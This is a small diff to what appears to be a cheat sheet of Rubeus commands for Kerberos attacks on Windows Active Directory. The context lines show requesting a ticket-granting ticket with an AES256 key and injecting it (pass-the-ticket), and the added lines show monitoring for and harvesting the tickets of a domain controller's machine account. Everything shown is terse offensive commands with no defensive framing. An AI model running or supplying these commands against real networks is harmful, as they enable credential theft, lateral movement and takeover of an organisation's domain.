@@ -37,3 +37,8 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 
 Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<Ticket> /ptt
 ```
+
+# Rubeus - Harvest TGT of specific user
+```
+Rubeus.exe monitor /interval:10 /targetuser:DC01$
+```
